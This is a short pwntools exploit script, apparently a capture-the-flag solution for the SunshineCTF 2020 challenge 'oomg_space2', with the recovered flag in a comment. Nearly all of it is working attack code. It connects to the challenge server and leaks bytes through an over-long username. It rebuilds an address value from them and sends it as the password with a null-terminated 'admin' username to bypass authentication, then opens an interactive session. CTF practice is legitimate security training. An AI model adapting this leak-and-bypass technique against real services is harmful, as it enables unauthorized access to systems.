#exploit for space2
#sun{w0uld_y0u_b3l13v3_1_f0rg07_4b0u7_null_byt35???}
from pwn import *
import time
elf = ELF("./oomg_space2")
context.binary=elf
target=remote('chal.2020.sunshinectf.org' ,20004)
#target=process([elf.path])
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(pwd,user="admin\x00"):
	sa("USER\n",user)
	sa("PASSWORD\n",pwd)

def leak(user="A"*0x10):
	sa("USER\n",user)
	target.recvuntil("A"*0x10)
	leaks=target.recvline().strip("\n")
	return leaks
	
leak=leak()
realleak="\x00"*2
for i in range(6):
	realleak+=leak[5-i]
pie_leak=u64(realleak.ljust(8,"\x00"))
print(hex(pie_leak))
attack(p64(pie_leak))
target.send("A")
target.interactive()
